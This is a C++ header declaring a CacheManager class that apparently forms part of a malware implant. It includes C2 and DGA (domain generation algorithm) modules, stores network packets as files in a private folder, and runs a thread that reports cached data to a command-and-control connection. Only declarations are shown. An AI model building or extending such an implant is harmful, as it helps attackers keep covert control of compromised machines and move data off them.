#pragma once
#include <string>
#include <filesystem>
#include <fstream>
#include "../conf/c2.h"
#include "../logging/logging.h"
#include "../utils/rand.h"
#include "../types/types.h"
#include "../c2/dga.h"
#include "../net/packet.h"
#include "../c2/c2.h"


namespace fs = std::filesystem;

class CacheManager {
public:
	CacheManager(int max_files,C2* c2ptr);

	int cache(netpack::Packet& tocache);
	int remove(const std::string id);
	std::vector<netpack::bytevec> get_all_cached();
	void start_report_thread();

private:
	std::string fsroot ;
	std::string private_folder;
	const int max_files;
	std::vector<HANDLE> aquired_files;
	C2* c2connection = nullptr;

	void make_fsroot();
	stringvec list_files(const std::string& dir);
	stringvec list_folders(const std::string& dir);
	std::string rand_avail_filename();
	bool aquire_file(std::string id);
	void release_file(std::string id);
	void report_cache_t();
	void report_cached(std::string fname);

};